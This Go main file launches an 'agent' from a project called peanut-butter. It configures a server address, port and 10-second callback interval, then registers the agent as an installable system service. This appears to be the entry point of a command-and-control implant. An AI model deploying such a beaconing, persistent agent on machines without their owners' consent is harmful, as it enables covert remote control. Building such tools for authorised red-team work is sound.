package main

import (
	"log"
	"time"

	"github.com/MeHungr/peanut-butter/internal/agent"
	"github.com/kardianos/service"
)

func main() {
	// ========== Config ==========
	agentID := agent.GetLocalIP()
	serverIP := "localhost"
	serverPort := 8080
	callbackInterval := 10 * time.Second
	debugMode := false
	// ============================

	// Constructs the agent and starts it
	a := agent.New(agentID, serverIP, serverPort, callbackInterval, debugMode)

	// Create service wrapper and run as service
	prg := &program{agent: a}
	svcConfig := getServiceConfig()

	svc, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatalf("service.New: %v", err)
	}

	// svc.Run will block and handle install/start/stop subcommands
	if err := svc.Run(); err != nil {
		log.Fatalf("service run error: %v", err)
	}

	// To run as a normal executable
	// a.Start()
}
